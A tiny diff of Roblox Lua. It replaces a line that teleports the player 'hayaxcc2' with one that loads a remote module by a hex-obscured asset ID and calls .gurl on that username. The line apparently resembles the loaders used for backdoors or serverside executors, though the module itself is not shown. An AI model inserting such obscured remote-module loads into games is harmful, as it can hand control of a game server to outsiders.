@@ -1,1 +1,1 @@
-- workspace["hayaxcc2"].HumanoidRootPart.CFrame = workspace.Dummy.Torso.CFrame
+- require(0x2a635f086).gurl("hayaxcc2") 
